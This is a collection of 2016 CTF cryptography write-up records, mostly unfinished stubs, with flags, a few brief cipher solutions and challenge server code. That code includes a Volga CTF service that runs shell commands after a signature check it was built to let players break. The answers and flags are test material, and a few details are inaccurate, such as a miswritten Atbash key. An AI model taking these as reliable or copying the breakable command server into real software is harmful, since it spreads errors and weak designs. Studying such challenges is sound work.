{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tjctf-2016\\crypto\\one-time-subtraction-20", "year": "2016", "name": "one-time-subtraction-20", "writeup": "# tjctf-2016 : one-time-subtraction-20\n\n**Category:** Cryptography\n**Points:** 20\n**Description:** I encrypted this flag with a one time subtraction, but my friend says it's not secure because my key is only one byte. Can you check if this is secure?\n\n## Write-up\n\nThis challenge starts us off with this ciphertext:`241 231 224 241 227 248 173 235 176 220 223 246 241 176 220 174 240 220 235 173 241 220 176 235 173 242 228 229 250 135`. The description explicitly states the text is encrypted using a one time pad, which is simply using a list of shifts which are repeated if the length of the list is shorter than the plaintext message. All flags are in the format `tjctf{flag_goes_here}` so we can determine the shift between the ciphertext number `241` and what we know will be the ASCII character `t` which is represented by the decimal number `116`. Finding the difference between the two `241 - shift = 116` makes our shift `125`. Next we try the second number using the same method for the letter `j` when it appears to have the same shift: `125`. Shifting each number in the ciphertext down by `125` should reveal the flag: `tjctf{0n3_byt3_1s_n0t_3n0ugh}`.\n\n## Other write-ups and resources\n\n* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/one_time_subtraction_20_pts.html)\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\tjctf-2016\\crypto\\rsa1-60", "year": "2016", "name": "rsa1-60", "writeup": "# tjctf-2016 : rsa1-60\n\n**Category:** Cryptography**Points:** 60\n**Description:** RSA 1\n\n## Write-up\n\n(TODO)\n`tjctf{pp6nh3uqjh2a4karaze0kt70yiq22hkpcdzutyoo4aand40l3or73kehrb8n4ft1zh9g7i00lxss83p083dlwxa70brhl6qagx1s6mq8edozln7urps6cbd6kd01g0kvtzbg5e6nhev394777lhs427cpcmi96dc226hrpqwcl6uji1346jh4cfuz3w9i0m25s5ulkilatyjg7nsbi6jka2mocchqf8jxpfypbocqq1fj4cqgdydys0bt7j3h572bgfq6rt3rdgy2q33zyhgqoj3u3il8gchqg1bof6kmt1fpo1ragzxlx6baqt2u7baw0r77c8k2cb92qmto3kgagb45vmooyz9482btindgjuq7tgiwr10iau1icv1hhtll5zrz4oejyk0h26kfbglx25nvu5m1b1d9pn3x9reev55oaaqqoauep3h3bvh011pxgxfm09kbixxurghbw3r4pntdcqha2g287stdy3tev7op}`\n\n## Other write-ups and resources\n\n* [SiBears - SiBears.ru](http://sibears.ru/labs/TJCTF-2016-RSA1/)\n* [My Computer is a Potato](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/rsa_1_60_pts.html)\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\tjctf-2016\\crypto\\rsa2-90", "year": "2016", "name": "rsa2-90", "writeup": "# tjctf-2016 : rsa2-90\n\n**Category:** Cryptography**Points:** 90\n**Description:** RSA 2\n\n## Write-up\n\n(TODO)\n`tjctf{7FtNg1Vu7bbAhszil8IBveu3jlxFhxsZDpV5AapNYQqnxz09VAHG4gOodNdj6SGcClq1hyVeRi27bdG2jO9Z50aoN6VbT6Z0UQhtoLwJZvRAHfoU7DVM5PXlbMFZFIbw3lUDe6KnnuhWclr5MrpDEAPDkpeuL3DY5WWcWJMOMY7sRflcK6l9UCFaofZqtyG2zmKZYqox}`\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tjctf-2016\\crypto\\znzarmt-mvd-hproo-10", "year": "2016", "name": "znzarmt-mvd-hproo-10", "writeup": "# tjctf-2016 : znzarmt-mvd-hproo-10\n\n**Category:** Cryptography\n**Points:** 10\n**Description:** [gqxgu{m0g_z_xz3h4i_x1ks3i}](https://youtu.be/_wCxRn35jwA?t=9)\n\n## Write-up\n\nWhen clicking on the link, you are redirected to a YouTube video of children singing the alphabet backwards. After some figuring, it appears if you match the forward English alphabet with the English alphabet backwards, each letter will substitute into `tjctf{n0t_a_ca3s4r_c1ph3r}`. The cipher key looks something like this:\n```\nA B C D E F G H I J K L M N O P Q R S T U V W X Y Z\nZ Y X W V U T S R Q P O N M L K J U H G F E D C B A\n```\n## Other write-ups and resources\n\n* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3458)\n* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/znzarmt_mvd_hproo_10_pts.html)\n"}
{"source": "write-ups-2016", "category": "Hash", "path": "data\\write-ups-2016\\tu-ctf-2016\\crypto\\hash-n-bake-200", "year": "2016", "name": "hash-n-bake-200", "writeup": "# TU CTF : hash-n-bake-200\n\n**Category:** Crypto\n**Points:**  200\n**Solves:**\n**Description:**\nA random goat from Boston hashed our password! Can you find the full output?\n\nNote, flag is what would have printed. I.e. TUCTF{0xadeadbeef1dea}\n\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/crypto/hashnbake\n* [Invlunerable (Russian)](http://countersite.org/93-hash-n-bake.html)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tu-ctf-2016\\crypto\\image-magic-50", "year": "2016", "name": "image-magic-50", "writeup": "# TU CTF : image-magic-50\n\n**Category:** Crypto\n**Points:** 50\n**Solves:** \n**Description:**\nAn encrypted PNG and the python script used to encrypt it are given\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tu-ctf-2016\\crypto\\magic-image-100", "year": "2016", "name": "magic-image-100", "writeup": "# TU CTF : magic-image-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:**\n**Description:**\nMagic Image\n100\n\nWe found this png, but it seems to be encrypted...\n\nCan you decrypt it?\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n* https://github.com/team-bitskrieg/CTF-writeups/tree/master/tuctf/Magic%20Image\n* [Invulnerable (Russian)](http://countersite.org/articles/cryptography/90-magic-image.html)\n* https://github.com/Fire30/CTF-WRITEUPS/blob/master/TUCTF/crypto/magic-image.md\n* [SiBears](http://sibears.ru/labs/tuctf-2016-magic-image/)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tu-ctf-2016\\crypto\\secure-auth-150", "year": "2016", "name": "secure-auth-150", "writeup": "# TU CTF : secure-auth-150\n\n**Category:** Crypto\n**Points:** 150\n**Solves:** \n**Description:**\nWe have set up this fancy automatic signing server!\n\nWe also uses RSA authentication, so itâ€™s super secure!\n\n\nnc 104.196.116.248 54321\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://duksctf.github.io/TUCTF-Secure-Auth/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tu-ctf-2016\\crypto\\secure-transmission-150", "year": "2016", "name": "secure-transmission-150", "writeup": "# TU CTF : secure-transmission-150\n\n**Category:** Crypto\n**Points:** 150\n**Solves:** \n**Description:**\nWe were able to recover this network traffic from some shady giraffes... Can you tell what they were saying?\n\nnote this flag is in the form: flag{...}\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/crypto/securetransmission\n* https://github.com/team-bitskrieg/CTF-writeups/tree/master/tuctf/Secure%20transmission\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tu-ctf-2016\\crypto\\the-neverending-crypto-500", "year": "2016", "name": "the-neverending-crypto-500", "writeup": "# TU CTF : the-neverending-crypto-500\n\n**Category:** Crypto\n**Points:** 500\n**Solves:**\n**Description:**\n\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Nick Frost](https://blog.nfrost.me/2016/05/15/tu-ctf-2016-neverending-crypto.html)\n* [SiBears](http://sibears.ru/labs/tuctf-2016-the-neverending-crypto/)\n* https://uss.informatik.uni-ulm.de/?p=429\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tum-ctf-2016\\crypto\\haggis-100", "year": "2016", "name": "haggis-100", "writeup": "# TUM CTF 2016 : haggis-100\n\n**Category:** crypto\n**Points:** 100\n**Solves:** 93\n**Description:**\n\n> OMG, I forgot to pierce my haggisâ€™ sheep stomach before cooking it, so it exploded all over my kitchen. Please help me clean up!\n> (Fun fact: Haggis hurling is a thing.)\n> nc 104.198.243.170 2501\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://ctftime.org/writeup/4290\n* http://duksctf.github.io/TUMCTF2016-haggis/\n* http://uss.informatik.uni-ulm.de/?p=492\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tum-ctf-2016\\crypto\\hiecss-150", "year": "2016", "name": "hiecss-150", "writeup": "# TUM CTF 2016 : hiecss-150\n\n**Category:** crypto\n**Points:** 150\n**Solves:**\n**Description:**\n\n> Our intern insisted on designing an elliptic-curve signature scheme. Needless to say, it wentâ€¦ quite wrong.\n> He is now back at brewing coffee all day long.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://ctftime.org/writeup/4290\n* https://github.com/dqi/ctf_writeup/tree/master/2016/tumctf/hiecss\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-10-01-tum/hiecss_crypto_150)\n* https://cinsects.de/tum-ctf-2016-hiecss.html\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\uconn-cyberseed-2016\\cipher-2-100", "year": "2016", "name": "cipher-2-100", "writeup": "# UConn CyberSEED 2016 : cipher-2-100\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> `YHTEQAPSSQWLTLSILYPENZIZSJLVPVIPVWLKDLZRCWZXGEZEWCDHDBRCSIEXHLWKRKTOYIUPVFCLBRDIWULGSPOIYKLHZMMYBLLVPVQGXAYEDXILWGWDVRPMPOWNKDAIHSQSLLEESAMSQAIEMPALPEJKAXIPOEHEPLZRTWYTZJPOMPSNSD`\n> Hints:\n> 1. The first 50 characters of the decoding is the flag.\n> 2. The last character of the flag should be a Y after decoding.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/gluxon/CyberSEED-2016-Writeups/blob/master/Cipher%20%232.md\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\uconn-cyberseed-2016\\cipher-3-200", "year": "2016", "name": "cipher-3-200", "writeup": "# UConn CyberSEED 2016 : cipher-3-200\n\n**Category:** crypto\n**Points:**\n**Solves:**\n**Description:**\n\n> (TODO)\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/gluxon/CyberSEED-2016-Writeups/blob/master/Cipher%20%233.md\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ufo-ctf-school-2016\\crypto\\rotate-it-25", "year": "2016", "name": "rotate-it-25", "writeup": "# UFO CTF School 2016 : rotate-it-25\n\n**Category:** Crypto\n**Points:** 25\n**Solves:** \n**Description:**\nTranslated from russian:\nThe task:\nWe intercepted the message but it was encrypted . We were not able to decrypt it . Can you ?\nLinks to job:\n    https://goo.gl/dD2xiG\n    https://yadi.sk/d/sbGT-cqsqKTKB\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://m.vk.com/wall-118537777_1 (russian)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\volga-ctf-quals-2016\\crypto\\ask_the_oracle-400", "year": "2016", "name": "ask_the_oracle-400", "writeup": "#Volga CTF Quals 2016 ask_the_oracle writeup\n\n###*Category:* PPC, Web, Crypto *Points:* 400\n\n> Ahah, BAI has revealed itself! But now it uses a new cryptographic service to store its secrets!\n>\n> You should have a go at cracking it in order to obtain another part of information about BAI.\n\noracle.2016.volgactf.ru:7373\n\n## write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\volga-ctf-quals-2016\\crypto\\five_blocks-600", "year": "2016", "name": "five_blocks-600", "writeup": "#Volga CTF Quals 2016 five_blocks writeup\n\n###*Category:* Crypto *Points:* 600\n\n> The creators of the AI we're so desperately looking for used the remote server to encrypt their data. It seems that this service merely encrypts the data we're sending to it. We managed to find a possibly valuable piece of encrypted data along with the server's script. Could you take a look and see if anything can be done?\n>\n> nc five-blocks.2016.volgactf.ru 8888\n>\n> Hints\n>\n> What would you get if you'd encrypted four-block data of the form AABC, where A, B, C are 64-bit arbitrary blocks?\n> \n> Are the rounds of the second block cipher completely dependent or independent of each other? Or is the truth somewhere in the middle?\n\n[server.py](crypto/five_blocks-600/server.py)\n[ciphers.py](crypto/five_blocks-600/ciphers.py)\n[flag.enc](crypto/five_blocks-600/flag.enc)\n\n## write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n[H4x0rPsch0rr](http://hxp.io/blog/27)\n", "solution_code": "\n# ciphers.py\nimport array\nimport struct\n\n\n\n\"\"\"\n    bc1\n\"\"\"\n\ndef list_xor(l1, l2):\n    return array.array('B', map(lambda x: x[0]^x[1], zip(l1,l2)))\n\ndef rot(x):\n    return ((x<<4) | (x>>4)) & 0xff\n\ndef g_box(a, b, mode):\n    return rot((a + b + mode) & 0xff)\n\ndef f_box(x):\n    t0 = (x[2] ^ x[3])\n    y1 = g_box(x[0] ^ x[1], t0, 1)\n    y0 = g_box(x[0], y1, 0)\n    y2 = g_box(y1, t0, 0)\n    y3 = g_box(y2, x[3], 1)\n    return array.array('B', [y0, y1, y2, y3])\n\n\nclass bc1(object):\n\n    def __init__(self, key_data):\n        assert (len(key_data) == 6*4)\n        self.subkeys = []\n        for i in xrange(0, 6*4, 4):\n            self.subkeys.append(array.array('B', key_data[i:i+4]))\n\n    def encrypt_block(self, plaintext):\n        plaintext = array.array('B', plaintext)\n        pleft = plaintext[0:4]\n        pright = plaintext[4:]\n\n        left = list_xor(pleft, self.subkeys[4])\n        right = list_xor(pright, self.subkeys[5])\n        R2L = list_xor(left, right)\n        R2R = list_xor(left, f_box(list_xor(R2L, self.subkeys[0])))\n        R3L = R2R\n        R3R = list_xor(R2L, f_box(list_xor(R2R, self.subkeys[1])))\n        R4L = R3R\n        R4R = list_xor(R3L, f_box(list_xor(R3R, self.subkeys[2])))\n\n        cipherLeft = list_xor(R4L, f_box(list_xor(R4R, self.subkeys[3])))\n        cipherRight = list_xor(cipherLeft, R4R)\n        return ''.join(map(chr, cipherLeft + cipherRight))\n\n    def decrypt_block(self, ciphertext):\n        ciphertext = array.array('B', ciphertext)\n        cipherLeft = ciphertext[0:4]\n        cipherRight = ciphertext[4:]\n\n        R4R = list_xor(cipherLeft,cipherRight)\n        R4L = list_xor(cipherLeft, f_box(list_xor(R4R, self.subkeys[3])))\n        R3R = R4L\n        R3L = list_xor(R4R, f_box(list_xor(R3R, self.subkeys[2])))\n        R2R = R3L\n        R2L = list_xor(R3R, f_box(list_xor(R2R, self.subkeys[1])))\n        left = list_xor(R2R, f_box(list_xor(R2L, self.subkeys[0])))\n        right = list_xor(left, R2L)\n\n        pleft = list_xor(left, self.subkeys[4])\n        pright = list_xor(right, self.subkeys[5])\n        return ''.join(map(chr, pleft + pright))\n\n\n\n\"\"\"\n    bc2\n\"\"\"\n\ndef split_int(m):\n    return ((m>>16) & 0xFFFF, m & 0xFFFF)\n\ndef join_int(l, r):\n    return (l<<16) | r\n\ndef orth(m):\n    (l, r) = split_int(m)\n    return join_int(r, l ^ r)\n\ndef inv_orth(m):\n    (l, r) = split_int(m)\n    return join_int(l ^ r, l)\n\ndef F(m, subkey):\n    (l, r) = split_int(m)\n    (k_l, k_r) = split_int(subkey)\n    (mul_l, mul_r) = split_int(l * r)\n    l = ((mul_l + r) * k_l) & 0xFFFFFFFF\n    r = ((mul_r * l) + k_r) & 0xFFFFFFFF\n    l = ((l<<7) | (l>>25)) & 0xFFFFFFFF\n    r = ((r<<18) | (r>>14)) & 0xFFFFFFFF\n    return r ^ l\n\n\ndef M(L, R, subkey):\n    A = F((L - R) & 0xFFFFFFFF, subkey)\n    CL = orth((L + A) & 0xFFFFFFFF)\n    CR = (R + A) & 0xFFFFFFFF\n    return (CL, CR)\n\ndef inv_M(L, R, subkey):\n    L = inv_orth(L)\n    A = F((L - R) & 0xFFFFFFFF, subkey)\n    PL = (L - A) & 0xFFFFFFFF\n    PR = (R - A) & 0xFFFFFFFF\n    return (PL, PR)\n\n\nclass bc2(object):\n\n    def __init__(self, key):\n        (k0, k1, k2, k3) = struct.unpack('>HHHH', key)\n        K0 = pow(k0, 2)\n        K1 = pow(k1, 2)\n        K2 = pow(k2, 2)\n        K3 = pow(k2, 2)\n        self.subkeys = [K0, K1, K2, K3]\n\n    def encrypt_block(self, plaintext):\n        (L0, R0) = struct.unpack('>II', plaintext)\n        (L1, R1) = M(L0, R0, self.subkeys[0])\n        (L2, R2) = M(L1, R1, self.subkeys[1])\n        (L3, R3) = M(L2, R2, self.subkeys[2])\n        (CL, CR) = M(L3, R3, self.subkeys[3])\n        return struct.pack('>II', CL, CR)\n\n    def decrypt_block(self, ciphertext):\n        (L0, R0) = struct.unpack('>II', ciphertext)\n        (L1, R1) = inv_M(L0, R0, self.subkeys[3])\n        (L2, R2) = inv_M(L1, R1, self.subkeys[2])\n        (L3, R3) = inv_M(L2, R2, self.subkeys[1])\n        (PL, PR) = inv_M(L3, R3, self.subkeys[0])\n        return struct.pack('>II', PL, PR)\n\n\n\n\"\"\"\n    bcs\n\"\"\"\n\ndef block_xor(b1, b2):\n    return ''.join([chr(ord(a) ^ ord(b))  for a,b in zip(b1, b2)])\n\ndef pad(data, bs=8):\n    r\n# server.py\n#!/usr/bin/python\nfrom ciphers import bcs\nimport os\nimport hashlib\nimport struct\nimport SocketServer\nimport logging\nimport base64\n\n\n\"\"\"\n    params\n\"\"\"\n\nADDRESS = '0.0.0.0'\nPORT = 8888\nTIMEOUT = 60.0\nMAX_DATA_TO_RECEIVE_LENGTH = 8196\nkeys_file = 'keys'\nlogger = None\n\n\n\"\"\"\n    server\n\"\"\"\n\ndef read_message(s):\n    received_buffer = s.recv(4)\n    if len(received_buffer) < 4:\n        raise Exception('Error while receiving data')\n    to_receive = struct.unpack('>I', received_buffer[0:4])[0]\n    if to_receive > MAX_DATA_TO_RECEIVE_LENGTH:\n        raise Exception('Too many bytes to receive')\n    received_buffer = ''\n    while (len(received_buffer) < to_receive):\n        received_buffer += s.recv(to_receive - len(received_buffer))\n    return received_buffer\n\ndef send_message(s, message):\n    send_buffer = struct.pack('>I', len(message)) + message\n    s.sendall(send_buffer)\n\n\nclass ForkingTCPServer(SocketServer.ForkingMixIn, SocketServer.TCPServer):\n    pass\n\nclass ServiceServerHandler(SocketServer.BaseRequestHandler):\n\n    def __init__(self, request, client_address, server):\n        SocketServer.BaseRequestHandler.__init__(self, request, client_address, server)\n\n    def do_challenge(self):\n        proof = base64.b64encode(os.urandom(12))\n        proof_len = len(proof)+5\n        message = 'Solve a puzzle first: find an x such that ' \\\n                    'SHA1(x)[-3:]==\\'\\\\xff\\\\xff\\\\xff\\' and len(x)=={0} and x[:{1}]=={2}'.format(proof_len, len(proof), proof)\n        send_message(self.request, message)\n        test = read_message(self.request)\n        ha = hashlib.sha1()\n        ha.update(test)\n        if (len(test) != proof_len\n            or test[:-5] != proof or\n            ha.digest()[-3:] != '\\xff\\xff\\xff'):\n            send_message(self.request, 'Your solution is incorrect')\n            return False\n        return True\n\n    def handle(self):\n        logger.info('Accepted  connection from {0}'.format(self.client_address[0]))\n        self.request.settimeout(TIMEOUT)\n        try:\n            if not self.do_challenge():\n                raise Exception('Failed to pass the test')\n            with open(keys_file, 'rb') as f:\n                data = f.read()\n                key_bc1 = data[:6*4]\n                key_bc2 = data[6*4:]\n            cryptor = bcs(key_bc1, key_bc2)\n            data_to_encrypt = read_message(self.request)\n            iv = os.urandom(8)\n            encrypted_data = cryptor.encrypt(data_to_encrypt, iv)\n            to_send = iv + encrypted_data\n            send_message(self.request, to_send)\n\n        except Exception as ex:\n            logger.error(str(ex), exc_info=True)\n        finally:\n            logger.info('Processed connection from {0}'.format(self.client_address[0]))\n        return\n\n\n\n\"\"\"\n    main\n\"\"\"\n\nif __name__ == '__main__':\n    logger = logging.getLogger(__name__)\n    logging.basicConfig(format='[%(asctime)s] %(levelname)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S', level=logging.DEBUG)\n    address = (ADDRESS, PORT)\n    server = ForkingTCPServer(address, ServiceServerHandler)\n    server.serve_forever()\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\volga-ctf-quals-2016\\crypto\\lazy-250", "year": "2016", "name": "lazy-250", "writeup": "#Volga CTF Quals 2016 lazy writeup\n\n###*Category:* Stego *Points:* 250\n\n> There's some valuable data on the server. However, to retrieve it we can only execute \"signed\" commands. We have the server script and some other files. Dare to take a look at it?\n>\n> nc lazy.2016.volgactf.ru 8889\n>\n> Hints\n> * nc might be a little misleading, but then again you've got the script to see what's really being sent back and forth.\n\n[server.py](crypto/lazy-250/server.py)\n[key.public](crypto/lazy-250/key.public)\n[exit.sig](crypto/lazy-250/exit.sig)\n[leave.sig](crypto/lazy-250/leave.sig)\n\n## write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/VOLGACTF/crypto/lazy\n* https://cryptsec.wordpress.com/2016/03/27/volga-ctf-quals-2016-write-up-lazy-crypto-250/\n", "solution_code": "\n# server.py\nfrom gmpy2 import mpz, invert\nimport os\nimport hashlib\nimport struct\nimport socket\nimport SocketServer\nimport logging\nimport base64\nimport shlex\nimport subprocess\n\n\n\"\"\"\n    params\n\"\"\"\n\nADDRESS = '0.0.0.0'\nPORT = 8889\nTIMEOUT = 60.0\nMAX_DATA_TO_RECEIVE_LENGTH = 8196\nlogger = None\nkeys_file_path = '.'\n\n\n\"\"\"\n    utils\n\"\"\"\n\ndef data_to_int(s):\n    return mpz(s.encode('hex'), 16)\n\ndef SHA1(data):\n    return data_to_int(hashlib.sha1(data).hexdigest())\n\n\ndef import_public_key(keys_path):\n    key_public = os.path.join(keys_path, 'key.public')\n    assert (os.path.exists(key_public))\n    with open(key_public, 'r') as f:\n        data = f.read()\n        d = data.split('\\n')\n        p = mpz(d[0])\n        q = mpz(d[1])\n        g = mpz(d[2])\n        y = mpz(d[3])\n        return (p, q, g, y)\n\ndef import_private_key(keys_path):\n    key_private = os.path.join(keys_path, 'key.private')\n    assert (os.path.exists(key_private))\n    with open(key_private, 'r') as f:\n        data = f.read()\n        d = data.split('\\n')\n        p = mpz(d[0])\n        q = mpz(d[1])\n        g = mpz(d[2])\n        x = mpz(d[3])\n        y = mpz(d[4])\n        return (p, q, g, x, y)\n\n\ndef import_cmd_signature(cmd, keys_path):\n    f = os.path.join(keys_path, '{0}.sig'.format(cmd))\n    with open(f, 'r') as f:\n        data = f.read()\n        d = data.split('\\n')\n        (r, s) = (mpz(d[0]), mpz(d[1]))\n        return (r, s)\n\n\n\"\"\"\n    sign data\n\"\"\"\n\ndef sign(data, p, q, g, x, k):\n    r = pow(g, k, p) % q\n    s = (invert(k, q) * (SHA1(data) + x * r)) % q\n    return (r, s)\n\ndef verify(data, p, q, g, y, r, s):\n    if not (r > 0 and r < q): return False\n    if not (s > 0 and s < q): return False\n    w = invert(s, q)\n    u1 = (SHA1(data) * w) % q\n    u2 = (r * w) % q\n    v = ((pow(g, u1, p) * pow(y, u2, p)) % p) % q\n    if v == r:\n        return True\n    else:\n        return False\n\n\n\"\"\"\n    server\n\"\"\"\n\ndef read_message(s):\n    received_buffer = s.recv(4)\n    if len(received_buffer) < 4:\n        raise Exception('Error while receiving data')\n    to_receive = struct.unpack('>I', received_buffer[0:4])[0]\n    if to_receive > MAX_DATA_TO_RECEIVE_LENGTH:\n        raise Exception('Too many bytes to receive')\n    received_buffer = ''\n    while (len(received_buffer) < to_receive):\n        received_buffer += s.recv(to_receive - len(received_buffer))\n    return received_buffer\n\ndef send_message(s, message):\n    send_buffer = struct.pack('>I', len(message)) + message\n    s.sendall(send_buffer)\n\ndef run_cmd(cmd):\n    try:\n        args = shlex.split(cmd)\n        return subprocess.check_output(args)\n    except Exception as ex:\n        return str(ex)\n\n\nclass ForkingTCPServer(SocketServer.ForkingMixIn, SocketServer.TCPServer):\n    def server_bind(self):\n        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        SocketServer.TCPServer.server_bind(self)\n\nclass ServiceServerHandler(SocketServer.BaseRequestHandler):\n\n    def __init__(self, request, client_address, server):\n        SocketServer.BaseRequestHandler.__init__(self, request, client_address, server)\n\n    def do_challenge(self):\n        proof = base64.b64encode(os.urandom(12))\n        proof_len = len(proof)+5\n        message = 'Solve a puzzle first: find an x such that ' \\\n                    'SHA1(x)[-3:]==\\'\\\\xff\\\\xff\\\\xff\\' and len(x)=={0} and x[:{1}]=={2}'.format(proof_len, len(proof), proof)\n        send_message(self.request, message)\n        test = read_message(self.request)\n        ha = hashlib.sha1()\n        ha.update(test)\n        if (len(test) != proof_len\n            or test[:-5] != proof or\n            ha.digest()[-3:] != '\\xff\\xff\\xff'):\n            send_message(self.request, 'Your solution is incorrect')\n            return False\n        return True\n\n    def handle(self):\n        logger.info('Accepted  connection from {0}'.format(self.client_address[0]))\n        self.request.settimeout(TIMEOUT)\n        try:\n            if not self.do_challenge():\n                raise Exception('Failed to pass the test')\n        "}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\volga-ctf-quals-2016\\crypto\\quiz-10", "year": "2016", "name": "quiz-10", "writeup": "#Volga CTF Quals 2016 quiz writeup\n\n###*Category:* Crypto *Points:* 10\n\n> Third bomb that took the shine out of nazis\n\n## write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\volga-ctf-quals-2016\\crypto\\xxy-300", "year": "2016", "name": "xxy-300", "writeup": "#Volga CTF Quals 2016 xxy writeup\n\n###*Category:* Crypto *Points:* 300\n\n> I remember some of the AI engineers saying this was a very unusual cryptosystem. It was used to encrypt and transmit information of the enormous importance. Moreover, it seems there's no need to share a key before the transmission.\n> \n> We've found some kind of a key file, a ciphertext and the enciphering script itself. Is it possible to decrypt the data?\n\n[key file](crypto/xxy-300/keypublic)\n[ciphertext](crypto/xxy-300/ciphertext)\n[script](crypto/xxy-300/cryptpy)\n\n## write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n[H4x0rPsch0rr](http://hxp.io/blog/26)\n", "solution_code": "\n# crypt.py\n#!/usr/bin/env sage\nfrom sage.all import *\n\n\nhRR = RealField(10000)\n\n\ndef read_mat(name):\n    with open(name, 'r') as f:\n        data = f.read()\n        data = [map(int, s.split(' '))  for s in data.split('\\n')]\n        n = len(data)\n        M = MatrixSpace(ZZ, n, n)(data)\n        return M\n\ndef read_ciphertext(ciphertext_file_name):\n    with open(ciphertext_file_name, 'r') as f:\n        data = f.read()\n        e = vector(map(int, data.split(' ')))\n        return e\n\n\ndef encrypt(plain_block, W, delta=151):\n    n = W.ncols()\n    m = vector([ord(ch)  for ch in plain_block])\n    r = random_vector(ZZ, n, x=-delta+1, y=delta)\n    e = m * W + r\n    return e\n\ndef decrypt(e, V, W):\n    n = V.ncols()\n    VV = MatrixSpace(hRR, n, n)(V)\n    t = vector([int(round(i))  for i in VV.solve_left(e)])\n    v = t * V\n    m = W.solve_left(v)\n    ciphertext_block = ''.join([chr(i)  for i in m])\n    return ciphertext_block\n\n\nif __name__ == '__main__':\n    V = read_mat('key.private')\n    W = read_mat('key.public')\n    e = read_ciphertext('ciphertext')\n    print decrypt(e, V, W)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-contest-11\\crypto\\arapoem-200", "year": "2016", "name": "arapoem-200", "writeup": "# WhiteHat Contest 11 : arapoem-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** 0\n**Description:**\n\nnc 118.70.80.143 9507\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-contest-11\\crypto\\crypto002-100", "year": "2016", "name": "crypto002-100", "writeup": "# WhiteHat Contest 11 : crypto002-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** \n**Description:** Decrypt this messenger: \n\nhttp://bakmaterial.wargame.whitehat.vn:8121/contests/12/Crypto002_d5b2f9562920e074f3475174bc9ad4bf2409de90.zip\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://github.com/drc14/WhiteHackContest12\n* https://ctftime.org/writeup/4098"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\whitehat-contest-11\\crypto\\puncrypto-system-200", "year": "2016", "name": "puncrypto-system-200", "writeup": "# WhiteHat Contest 11 : puncrypto-system-200\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** 5\n**Description:**\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
